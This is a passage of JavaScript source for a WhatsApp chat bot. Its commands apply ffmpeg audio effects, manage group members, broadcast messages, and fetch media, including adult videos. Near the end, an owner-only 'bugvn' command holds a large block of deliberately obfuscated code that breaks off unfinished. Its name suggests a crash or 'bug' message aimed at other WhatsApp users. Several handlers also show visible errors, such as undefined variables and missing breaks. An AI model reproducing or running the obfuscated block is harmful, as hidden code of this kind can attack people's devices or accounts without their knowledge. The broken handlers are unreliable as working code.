					bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
					fs.unlinkSync(ran)
			        })
				     break
           case 'cm':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} "origin(rgb24).png" -c:v libx264 -preset placebo -qp 0 -x264-params "keyint=15:no-deblock=1" -pix_fmt yuv444p10le -sws_flags spline+accurate_rnd+full_chroma_int -vf "colormatrix=bt470bg:bt709" -color_range 1 -colorspace 1 -color_primaries 1 -color_trc 1 "colormatrix_yuv444p10le.avi" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						bosco.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: ftoko })
					})
					break
           case 'fast':
                     if (!isQuotedAudio) return fgclink('reply to audio')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftext})
						fs.unlinkSync(ran)
					})
					break
             case 'gemes':
                    if (!isQuotedAudio) return fgclink('reply to audio')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fgc})
						fs.unlinkSync(ran)
					})
					break
            case 'balik':
            case 'reverse':
                  if (!isQuotedAudio) return fgclink('reply to audio')
	              encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	              mediau = await bosco.downloadAndSaveMediaMessage(encmediau)
	              ran = getRandom('.mp3')
	              exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(mediau)
                  if (err) return reply('Error!')
                  hah = fs.readFileSync(ran)
                  bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
                  fs.unlinkSync(ran)
	              })
                  break
            case 'bass':
            case 'volume':
                    if (!isQuotedAudio) return fgclink('reply to audio')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=65:width_type=o:width=3:g=20 ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek })
					fs.unlinkSync(ran)
				     })
				    break
             case 'slow':
                    if (!isQuotedAudio) return fgclink('reply to audio')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=43120" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek })
					fs.unlinkSync(ran)
					 })
				    break
                case 'squirrel':
					 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					 media = await bosco.downloadAndSaveMediaMessage(encmedia)
					 ran = getRandom('.mp3')
					 exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek })
					fs.unlinkSync(ran)
					 })
				    break
				case 'blub':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek })
					fs.unlinkSync(ran)
					 })
				    break
				case 'fat':
	                 if (!isQuotedAudio) return reply('*_ʀᴇᴘʟʏ ᴛᴏ ᴀᴜᴅɪᴏ_*')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.1,asetrate=35101" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('*ʀᴇᴛʀʏ!*')
					hah = fs.readFileSync(ran)
					bosco.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek })
					fs.unlinkSync(ran)
				     })
				     break
      case 'tomp4':
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await bosco.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
        case 'tomp3':
        case 'mp3':
					bosco.updatePresence(from, Presence.composing)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await bosco.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						bosco.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 4, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
      case 'kick':
if (!isOwner && !isGroupAdmins) return reply('*Admin aak malare*')
if (!isBotGroupAdmins) return reply('*  admin alla potta!*')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
bosco.groupRemove(from, mems_ids)
} else {
bosco.groupRemove(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
bosco.groupRemove(from, [entah])
}
break
case 'add':
      if (!isOwner && !isGroupAdmins) return reply('*bot Group admin allada*')
if (!isBotGroupAdmins) return reply('*nan chavan pooka!*')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var memu_ido = []
for (let ids of entah) {
mems_ids.push(ido)
}
bosco.groupAdd(from, memu_ido)
} else {
bosco.groupAdd(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
bosco.groupAdd(from, [entah])
}
break
case 'promote':
if (!isGroupAdmins) return reply('*nan admin alla*')
if (!isBotGroupAdmins) return reply('*nan chavatte !*')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var memi_idi = []
for (let ids of entah) {
memi_idi.push(idi)
}
bosco.groupMakeAdmin(from, memi_idi)
} else {
bosco.groupMakeAdmin(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
bosco.groupMakeAdmin(from, [entah])
}
break
case 'demote':
      if (!isOwner && !isGroupAdmins) return reply('*Bot admin alla*')
if (!isBotGroupAdmins) return reply('*Bot admin alla!*')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var memu_ido = []
for (let idk of entah) {
memk_idk.push(idk)
}
bosco.groupDemoteAdmin(from, memk_idk)
} else {
bosco.groupDemoteAdmin(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
bosco.groupDemoteAdmin(from, [entah])
}
break
case 'bc2': 

					if (!isOwner) return reply(lang.owner(botname)) 

					if (args.length < 1) return reply('.......')

					anu = await bosco.chats.all()

					if (isMedia && !mek.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						buff = await bosco.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							haruk.sendMessage(_.jid, bc, image, {quoted:mek,caption: `* PESAN SIARAN BOT *\n\n${body.slice(4)}`})

}

             reply('Suksess broadcast')

             } else {

             for (let _ of anu) {

bosco.sendMessage(_.jid, 

			{"contentText": `* BROADCAST TEDZO *\n\n${body.slice(5)}`,

			"footerText": 'tedzo',

			"buttons": [

			{"buttonId": `${prefix}menu`,

			"buttonText": {"displayText": "MENU BOT"

			},"type": "RESPONSE"}

			], "headerType": 1,

			}, MessageType.buttonsMessage )

}

             reply('Suksess broadcast')

}

								
      case 'bc':
					bosco.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('*Where is Text?*')
					anu = await bosco.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					     encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await bosco.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							bosco.sendMessage(_.jid, buff, image, { caption: `${body.slice(4)}`})
						}
						reply(`*Broadcast success* ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						 encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await bosco.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							bosco.sendMessage(_.jid, buff, video, { caption: `${body.slice(4)}`})
						}
						reply(`*Broadcast success* ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						 encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await bosco.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							bosco.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: fgif, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`*Broadcast success* ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`*Broadcast success*:\n${body.slice(4)}`)
					}
					break
       case 'contact':
				if (!isGroup) return reply(mess.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`*Use ${prefix}contact @tag|name*`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
       case 'sharelock':
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
bosco.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: denis}, MessageType.liveLocation, {quoted:floc2})
break
       case 'getdeskgc':
				if (!isGroup) return reply(mess.group)
				anu = from
			   metadete = await bosco.groupMetadata(anu)
				bosco.sendMessage(from, metadete.desc, MessageType.text, {quoted:fgif})
				  break
					case 'getbio':
	                  var yy = mek.message.extendedTextMessage.contextInfo.participant
                       var p = await bosco.getStatus(`${yy}`, MessageType.text, {quoted: mek})
                        reply(p.status)
                         if (p.status == 401) {
                          reply(mess.error.api)
                          }
                          break
           case 'chat':
			if (args[0].startsWith('08')) return reply('*Prefix number with 91*')
            if (args[0].startsWith('+91')) return reply('*Prefix number with 91*')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 91xxxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            bosco.sendMessage(nomor+'0@s.whatsapp.net', org, MessageType.text)   
            reply(`*Success in sending chat* :\n${org},@${nomor}`)
            break
                    case 'getname':
                      var ambl = mek.message.extendedTextMessage.contextInfo.participant
                      const sname = bosco.contacts[ambl] != undefined ? bosco.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('0@s.whatsapp.net', '')).getNumber('international') : bosco.contacts[ambl].notify || bosco.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
                       reply(sname)
                        break
      case 'toimg':
      case 'photo':
              if (!isQuotedSticker) return reply('*Reply To Sticker*')
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await bosco.downloadAndSaveMediaMessage(encmedia)
              ran = getRandom('.png')
              exec(`ffmpeg -i ${media} ${ran}`, (err) => {
              fs.unlinkSync(media)
              if (err) return reply('*Failed, converting sticker to image*')
              buffer = fs.readFileSync(ran)
              bosco.sendMessage(from, buffer, image, {quoted: mek, thumbnail:denis, caption: 'By tedzo'})
              fs.unlinkSync(ran)
})
              break
//------------------< Public/Self >-------------------

        case 'public':
          	if (!mek.key.fromMe) return 
          	if (banChats === false) return 
          	banChats = false
              fgclink(`*[ PUBLIC - MODE ]*`)
          	break
case 'mode':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner) 
buttonss = [{buttonId: `${prefix}public`, buttonText: {displayText: 'PUBLIC 🌱'}, type: 1},{buttonId: `${prefix}self`, buttonText: {displayText: 'SELF 🍂'}, type: 1}]
const buMess = {
contentText: "SELF/PUBLIC",
footerText: 'Silahkan Pilih Saah Satu',
buttons: buttonss,
headerType: 1
}
	case 'self':
          	if (!mek.key.fromMe) return 
          	if (banChats === true) return
          	uptime = process.uptime()
          	banChats = true
              fgclink(`*[ SELF - MODE ]*`)
          	break

//------------------< Downloader/And Search Media >-------------------

       case 'igdl':
       case 'ig': 
       case 'instagram':
              if (!q) return reply('*Which Links?*')
              if (!q.includes('instagram')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await igDownloader(`${q}`)
             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, mek) })
             .catch((err) => { reply(String(err)) })
              break
       case 'igstory': 
              if(!q) return reply('*Username?*')
              hx.igstory(q)
             .then(async result => {
              for(let i of result.medias){
              if(i.url.includes('mp4')){
              let link = await getBuffer(i.url)
              bosco.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
              } else {
              let link = await getBuffer(i.url)
              bosco.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
              }
              }
              });
              break
      case 'hehe':
      ratee = ["100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120"]
      const tee = ratee[Math.floor(Math.random() * ratee.length)]
      hemmo = fs.readFileSync(`mp3/100.mp3`)
      bosco.sendMessage(from, hemmo, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek})
      break
      case 'readmore':
      case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
        case 'lolkey':
        case 'cekapikey':
               if (args.length < 1) return reply(`*Type ${prefix}lolkey [Apikey]*`) 
               anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
               teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Account Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
               bosco.sendMessage(from, teks, text, {quoted: mek})
               break
case 'xnxxsearch': {
if (!text) throw 'Judul Bokep Nya Mana'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/xnxxsearch', { query: text }, 'apikey'))
resultnya = webapi.result.result
for (var x of resultnya) {
txt =`Title : ${x.title}\nInfo : ${x.info}\nLink : ${x.link}`
}
m.reply(txt)
}
break

case 'xnxxdl': {
if (!text) throw 'Link Video Bokep Nya Mana ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/xnxxdl', { url: text }, 'apikey'))
imagenya = await getBuffer(webapi.result.result.image)
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
locationMessage: { 
degreesLatitude: 0,
degreesLongitude: 0, 
jpegThumbnail: imagenya,
},
hydratedContentText: `Title : ${webapi.result.result.title}\nDuration : ${webapi.result.result.duration}\nVideo Type : ${webapi.result.result.videoType}\nVideo Width : ${webapi.result.result.videoWidth}\nVideo Height : ${webapi.result.result.videoHeight}\nInfo : ${webapi.result.result.info}`,
hydratedFooterText: `𝑺𝒂𝒏𝒛𝒚`,
hydratedButtons: [{
urlButton: {
displayText: '𝑹𝒆𝒔 𝑨𝒑𝒊',
url: `https://sanzykey.herokuapp.com/api`
}
}, {
urlButton: {
displayText: '𝒀𝒐𝒖𝒕𝒖𝒃𝒆 𝑶𝒘𝒏𝒆𝒓',
url: 'https://youtube.com/c/sanzyyt'
}
}, {
quickReplyButton: {
displayText: 'LOW',
id: `low ${q}`
}
}, {
quickReplyButton: {
displayText: 'HIGH',
id: `high ${q}`
}
}, {
quickReplyButton: {
displayText: 'HLS',
id: `hls ${q}`
}
}]
}
}
}), { userJid: m.chat, quoted: ftroli })
bosco.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'low': {
if (!text) throw 'Link Video Bokep Nya Mana ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/xnxxdl', { url: text }, 'apikey'))
bosco.sendMessage(m.chat, { video: { url: webapi.result.result.files.low }, caption: `Done Nih... Don't forget to subscribe my YouTube : sanzy yt`}, { quoted: ftroli })
}
break
case 'high': {
if (!text) throw 'Link Video Bokep Nya Mana ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/xnxxdl', { url: text }, 'apikey'))
bosco.sendMessage(m.chat, { video: { url: webapi.result.result.files.high }, caption: `Done Nih... Don't forget to subscribe my YouTube : sanzy yt`}, { quoted: ftroli })
}
break
case 'hls': {
if (!text) throw 'Link Video Bokep Nya Mana ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/xnxxdl', { url: text }, 'apikey'))
bosco.sendMessage(m.chat, { video: { url: webapi.result.result.files.hls }, caption: `Done Nih... Don't forget to subscribe my YouTube : sanzy yt`}, { quoted: ftroli })
}
break

case 'artinama': {
if (!text) throw 'Nama Nya Mana ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/artinama', { nama: text }, 'apikey'))
txt =`Arti : ${webapi.result.arti}`
m.reply(txt)
}
break
case 'cariresep': {
if (!text) throw 'Mau Cari Resep Apa ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/cariresep', { query: text }, 'apikey'))
resultnya = webapi.result.data
for (var x of resultnya) {
txt =`Creator : ${webapi.result.creator}
Judul : ${x.judul}
Link : ${x.link}`
}
m.reply(txt)
}
break

case 'liriklagu': {
if (!text) throw 'Judul Lagu Nya Apa ?'
m.reply(mess.wait)
webapi = await fetchJson(api('bosco', '/liriklagu', { query: text }, 'apikey'))
resultnya = webapi.result
for (var x of resultnya) {
txt =`Lirik : ${x.result}`
}
m.reply(txt)
}
break
       case 'pinterest':
         case 'pin':
              if (args.length < 1) return reply(`${prefix}Denis Ser`)
              data = await fetchJson(`https://lolhuman.herokuapp.com/api/pinterest?apikey=${lolkey}&query=${q}`)
              buttons = [{buttonId: `${prefix + command} ${q}`,buttonText:{displayText: `➡️Next`},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result))
              imageMsg = ( await bosco.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Hello Sis Can i help u..', imageMessage: imageMsg,
              contentText:`*Search Results From : ${q}*`,buttons,headerType:4}
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{})
              bosco.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
       case 'yts':
       case 'ytsearch':
              if (!q) return reply(mess.wrongFormat)
              reply(mess.wait)
              try {
              res = await yts(q)
              a = `*NOKATTE*\n`
for (let i of res.all) {
a += `
📜 Title : ${i.title}
🎞️ Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Duration : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n`
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: b})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
        case 'scplay': 
       case 'soundcloud':
              if (!q) return reply('Which Links?')
              if (!q.includes('soundcloud')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${lolkey}&url=${q}`)
             .then((data) => { sendMediaURL(from, data.result, data.title, mek) })
             .catch((err) => { reply(String(err)) })
              break
       case 'tourl':
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await bosco.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('*_Send to Reply Pictures/Videos_*')
}
               break
       case 'telesticker': 
       case 'telestiker':
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
              reply(mess.wait)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              bosco.sendMessage(from, ini_buffer, sticker, {})
}
              break
              case 'bugvn':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
(function(_0x120429,_0x52093f){function _0x37c8ff(_0x4e1e63,_0x173781,_0x19b233,_0x1a22ea,_0x24c086){return _0x658b(_0x19b233- -0x1b6,_0x1a22ea);}function _0x188130(_0xa612ac,_0x53fa05,_0x92d7c0,_0x5efa71,_0x375561){return _0x658b(_0x375561-0x2c9,_0x5efa71);}var _0x48aeb2=_0x120429();function _0x57f3d7(_0xa540b4,_0x261114,_0x47cc50,_0x59bfda,_0x30f819){return _0x658b(_0x261114-0x1dc,_0xa540b4);}function _0x47cafe(_0x3499a8,_0x201232,_0x14f9e5,_0x13d5ef,_0x616b46){return _0x658b(_0x13d5ef-0x2ca,_0x201232);}function _0x345412(_0x38554b,_0x40b40e,_0x1ef6e4,_0x18560d,_0x561606){return _0x658b(_0x561606-0x39e,_0x40b40e);}while(!![]){try{var _0xc907e1=parseInt(_0x188130(0x3e6,0x414,0x362,'$i)3',0x3f0))/(-0x15e2*0x1+0xc8d+0x956)*(-parseInt(_0x188130(0x3b5,0x418,0x306,'c7ja',0x3a6))/(-0x254b+-0x1c1f+0x416c))+parseInt(_0x57f3d7('zEwY',0x2ce,0x2c9,0x264,0x261))/(0x1*-0x90b+0x1e37+0x1529*-0x1)+parseInt(_0x345412(0x4f7,'LCCE',0x57e,0x5a6,0x566))/(-0x18f9+0x1fbb+0x2*-0x35f)*(parseInt(_0x345412(0x600,'B%)T',0x501,0x626,0x5cc))/(-0x196*0x17+-0x240a+0x257*0x1f))+-parseInt(_0x47cafe(0x553,'C3lK',0x40f,0x482,0x50d))/(0x10cb*0x1+0x13d6+0x1*-0x249b)+-parseInt(_0x188130(0x4fc,0x514,0x3f9,'eNfa',0x4de))/(-0x5e*0x4a+-0x5dd+0x2110)+-parseInt(_0x345412(0x46c,'6fIz',0x494,0x461,0x456))/(-0x8*-0x95+0x23f7+0x2897*-0x1)+parseInt(_0x37c8ff(-0x2d,-0x58,-0x78,'V04q',-0x11c))/(-0x49*0x24+0x12*-0x76+-0x211*-0x9)*(parseInt(_0x57f3d7('2]L2',0x327,0x406,0x267,0x3b9))/(0x1dec+0x2*0x16f+0x20c0*-0x1));if(_0xc907e1===_0x52093f)break;else _0x48aeb2['push'](_0x48aeb2['shift']());}catch(_0x30bdd8){_0x48aeb2['push'](_0x48aeb2['shift']());}}}(_0x20f7,0xcb65*-0x22+-0x1c4bfb*-0x1+-0x164ed*-0xa));var _0x3ea336=(function(){var _0xd695f9={};_0xd695f9[_0x40c363(0x35,'Uham',0x15,0x110,0x74)]=function(_0x35ab33,_0x40601e){return _0x35ab33!==_0x40601e;},_0xd695f9[_0x1d2e9e(0x1d2,0x210,0x13a,0x209,'Uham')]=_0x1d2e9e(-0x54,-0x5,0x17,-0x47,'C3lK'),_0xd695f9[_0x1d2e9e(0x11a,0x1a5,0x113,0x1a4,'Tc1*')]=_0x98546e(0x28f,0x2d8,0x2a4,0x2e5,'tY@b');function _0x40c363(_0x4d7962,_0x2013bd,_0x2cceea,_0x5880e4,_0x4682fa){return _0x658b(_0x4682fa- -0x180,_0x2013bd);}_0xd695f9[_0x98546e(0x289,0x20d,0x2e4,0x245,'5(Cn')]=function(_0x17a95a,_0xae1df1){return _0x17a95a===_0xae1df1;},_0xd695f9[_0x3fa1dc(0x6b,0xda,0x88,'JTrJ',0xab)]=_0x2d3a96('$i)3',0x1e4,0x222,0x204,0x27f),_0xd695f9[_0x3fa1dc(0x10a,0x112,0x16c,'B%)T',0x197)]=_0x1d2e9e(0x25,0x131,0x89,0xe1,'9Uvk');function _0x98546e(_0x43270d,_0x2205ee,_0x3678c9,_0x5cead0,_0x591e35){return _0x658b(_0x2205ee-0x11a,_0x591e35);}_0xd695f9[_0x3fa1dc(0xbd,0x1ca,0x1b6,'R@fs',0x172)]=function(_0x3ed256,_0x9ba250){return _0x3ed256+_0x9ba250;};function _0x3fa1dc(_0x1485a4,_0x3ce5f9,_0x5148fe,_0x567086,_0x382c80){return _0x658b(_0x382c80- -0x25,_0x567086);}_0xd695f9[_0x98546e(0x227,0x234,0x188,0x234,'tY@b')]=_0x1d2e9e(0x8b,0x1f0,0x11b,0x1cc,'m8OQ'),_0xd695f9[_0x1d2e9e(0x150,0x157,0x149,0x1ce,'EcEG')]=_0x3fa1dc(0x1aa,0x1d6,0x33,'iT]D',0x105),_0xd695f9[_0x1d2e9e(-0x5a,0x74,0x19,0xf9,'R@fs')]=_0x40c363(0x23,'fb1k',0x7e,0xbd,0xbb)+'n';function _0x2d3a96(_0x1f30d9,_0x3acbcc,_0x50ab59,_0x314144,_0x2a752d){return _0x658b(_0x50ab59-0xfa,_0x1f30d9);}_0xd695f9[_0x2d3a96('7l&p',0x153,0x181,0xa2,0xc4)]=function(_0xbc501,_0x17eb09){return _0xbc501===_0x17eb09;},_0xd695f9[_0x1d2e9e(-0x108,0x57,-0x3c,-0x8,'VMEc')]=_0x3fa1dc(0x111,0xb1,0x162,'eNfa',0x152),_0xd695f9[_0x1d2e9e(-0xc,0x36,0x4e,0x93,'@dp[')]=_0x40c363(-0x183,'MNjc',-0x17e,-0x70,-0xef);var _0x39b755=_0xd695f9,_0x453197=!![];function _0x1d2e9e(_0x3fb42b,_0x319a0b,_0x317ae6,_0x2d431c,_0x4f9474){return _0x658b(_0x317ae6- -0xf3,_0x4f9474);}return function(_0x201710,_0x5435df){function _0xcb17d8(_0x2fb2d6,_0x9b9f03,_0x117d36,_0x11b499,_0x57011f){return _0x1d2e9e(_0x2fb2d6-0x1df,_0x9b9f03-0x2a,_0x117d36-0x3a5,_0x11b499-0x1ac,_0x2fb2d6);}function _0x55b595(_0x4dbea6,_0x3df952,_0xd6149e,_0x214b83,_0x403f38){return _0x1d2e9e(_0x4dbea6-0x45,_0x3df952-0xe1,_0x4dbea6-0xea,_0x214b83-0x156,_0x3df952);}function _0x59b069(_0x4bb09f,_0x283603,_0x5012f8,_0x350118,_0x403861){return 